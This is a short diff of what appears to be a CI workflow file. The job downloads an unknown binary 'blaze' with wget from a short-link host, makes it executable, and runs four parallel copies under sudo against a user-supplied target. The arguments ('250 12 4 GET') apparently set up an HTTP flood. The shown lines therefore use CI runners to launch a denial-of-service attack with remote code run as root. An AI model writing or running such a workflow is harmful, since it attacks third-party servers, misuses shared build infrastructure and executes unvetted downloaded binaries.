@@ -25,8 +25,7 @@ jobs:
           TARGET="${{ inputs.target }}"
           wget https://curl.by/OcB6A/blaze
           chmod +x blaze
-          chmod +x Test.py
-
+          
           PIDS=()
           for i in {1..4}; do
             sudo timeout 260 ./blaze "$TARGET" 250 12 4 GET 
